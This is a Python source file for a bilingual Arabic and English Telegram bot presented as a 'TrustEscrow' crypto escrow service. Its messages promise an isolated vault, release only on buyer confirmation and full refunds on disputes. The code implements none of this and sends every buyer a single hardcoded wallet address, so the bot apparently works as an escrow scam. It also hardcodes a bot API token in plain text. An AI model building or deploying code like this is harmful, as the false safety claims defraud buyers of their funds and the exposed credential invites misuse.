import telebot
from telebot import types
import datetime

API_TOKEN = '8806803636:AAGx0ck3UwL594FLx_G2BaFfwwXDux7d1v8'
bot = telebot.TeleBot(API_TOKEN)

ADMIN_USERNAME = "@HE_5TE"
WALLET_ADDRESS = "D5nB2WhVgKDpS2N3Zx7uXFNV1zMqXiBh777XnQFx4kpu"

# القاموس الثنائي للغة
TEXTS = {
    'ar': {
        'welcome': "🛡️ *أهلاً بك في TrustEscrow*\n\nنظام وساطة رقمي آمن. لا نتحكم في الأموال، هي تُحفظ في محفظة وساطة مشفرة وتُرسل تلقائياً للبائع فور وصولها.\n\nفي حال حدوث نزاع، يتم تجميد المبلغ فوراً وفحص المراسلات لإرجاع الحق لأصحابه.\n\nاختر اللغة:",
        'start_btn': "🚀 البدء بصفقة جديدة",
        'terms_btn': "📄 شروط الأمان",
        'service_prompt': "📦 ما هي الخدمة أو السلعة؟",
        'partner_prompt': "👤 أدخل يوزر الطرف الآخر:",
        'amount_prompt': "💰 أدخل المبلغ (USDT):",
        'summary': "✅ *تم فتح الطلب بنجاح!*\n\nالخدمة: {s}\nالطرف الآخر: {p}\nالمبلغ: {a}\n\n⚠️ *ملاحظة أمان:* أموالك محمية في محفظة الوساطة ولا يمكن للبائع سحبها إلا بعد تأكيدك. في حال النزاع، يتم إرجاع المبلغ كاملاً للمشتري في دقائق.",
    },
    'en': {
        'welcome': "🛡️ *Welcome to TrustEscrow*\n\nSecure digital escrow. We do not hold funds; they are kept in a secure vault and released automatically to the seller upon confirmation.\n\nIn case of a dispute, funds are frozen immediately for investigation and manual refunding.\n\nPlease select language:",
        'start_btn': "🚀 Start New Escrow",
        'terms_btn': "📄 Safety Terms",
        'service_prompt': "📦 What is the service/item?",
        'partner_prompt': "👤 Enter partner's username:",
        'amount_prompt': "💰 Enter amount (USDT):",
        'summary': "✅ *Order Created Successfully!*\n\nService: {s}\nPartner: {p}\nAmount: {a}\n\n⚠️ *Safety Note:* Your funds are protected in the escrow vault and cannot be released without your confirmation. Disputes lead to an immediate full refund to the buyer.",
    }
}

user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar"),
               types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"))
    bot.send_message(message.chat.id, "🛡️ Welcome to TrustEscrow | أهلاً بك في TrustEscrow", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def set_lang(call):
    lang = call.data.split('_')[1]
    user_data[call.message.chat.id] = {'lang': lang}
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(TEXTS[lang]['start_btn'], callback_data="new_order"),
               types.InlineKeyboardButton(TEXTS[lang]['terms_btn'], callback_data="terms"))
    bot.edit_message_text(TEXTS[lang]['welcome'], call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "terms")
def show_terms(call):
    lang = user_data.get(call.message.chat.id, {}).get('lang', 'ar')
    terms_text = {
        'ar': "📜 *شروط وأمان TrustEscrow*\n\n1. الأموال تُحفظ في محفظة وساطة مستقلة.\n2. يتم تحويل الأموال للبائع فور تأكيد المشتري للاستلام.\n3. في حال النزاع، يتم تجميد المحفظة فوراً.\n4. عمولتنا 3% تُخصم عند إتمام الصفقة بنجاح.",
        'en': "📜 *TrustEscrow Safety Terms*\n\n1. Funds are held in a secure, isolated escrow vault.\n2. Funds are released upon buyer confirmation.\n3. In case of a dispute, the vault is frozen immediately.\n4. Our 3% fee applies upon successful completion."
    }
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📖 دليل فتح المحافظ", callback_data="wallet_guide"))
    markup.add(types.InlineKeyboardButton("🔙 عودة للرئيسية", callback_data="lang_" + lang))
    bot.edit_message_text(terms_text[lang], call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "wallet_guide")
def show_wallet_guide(call):
    lang = user_data.get(call.message.chat.id, {}).get('lang', 'ar')
    guide_text = {
        'ar': ("📖 *دليل فتح محفظة رقمية*\n\nلإتمام الصفقة، تحتاج لمحفظة USDT.\n\n1️⃣ *بينانس (للمبتدئين):*\n[شاهد شرح فتح حساب بينانس](https://www.youtube.com/results?search_query=شرح+فتح+حساب+بينانس)\n\n2️⃣ *تراست واليت (تحكم كامل):*\n[شاهد شرح إنشاء محفظة تراست واليت](https://www.youtube.com/results?search_query=شرح+إنشاء+محفظة+تراست+واليت)\n\n⚠️ *تنبيه:* تأكد دائماً من اختيار الشبكة الصحيحة (مثل TRC20 أو SOL) لتجنب ضياع أموالك."),
        'en': ("📖 *Digital Wallet Guide*\n\nTo complete the trade, you need a USDT wallet.\n\n1️⃣ *Binance (For Beginners):*\n[Watch Binance Setup Tutorial](https://www.youtube.com/results?search_query=how+to+create+a+binance+account)\n\n2️⃣ *Trust Wallet (Full Control):*\n[Watch Trust Wallet Setup Tutorial](https://www.youtube.com/results?search_query=how+to+create+a+trust+wallet)\n\n⚠️ *Note:* Always select the correct network (e.g., TRC20 or SOL) to avoid loss of funds.")
    }
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="terms"))
    bot.edit_message_text(guide_text[lang], call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "new_order")
def ask_service(call):
    lang = user_data[call.message.chat.id]['lang']
    bot.send_message(call.message.chat.id, TEXTS[lang]['service_prompt'])
    bot.register_next_step_handler(call.message, get_partner)

def get_partner(message):
    user_data[message.chat.id]['service'] = message.text
    lang = user_data[message.chat.id]['lang']
    bot.send_message(message.chat.id, TEXTS[lang]['partner_prompt'])
    bot.register_next_step_handler(message, get_amount)

def get_amount(message):
    user_data[message.chat.id]['partner'] = message.text
    lang = user_data[message.chat.id]['lang']
    bot.send_message(message.chat.id, TEXTS[lang]['amount_prompt'])
    bot.register_next_step_handler(message, finish_order)

def finish_order(message):
    amount = message.text
    u_id = message.chat.id
    d = user_data[u_id]
    lang = d['lang']
    msg = TEXTS[lang]['summary'].format(s=d['service'], p=d['partner'], a=amount)
    msg += f"\n\n📍 *Wallet:* `{WALLET_ADDRESS}`\n📞 Support: {ADMIN_USERNAME}"
    bot.send_message(u_id, msg, parse_mode="Markdown")
    bot.send_message(ADMIN_USERNAME, f"🔔 New Order from {message.from_user.username}\nService: {d['service']}\nAmount: {amount}")

if __name__ == '__main__':
    bot.polling(none_stop=True)
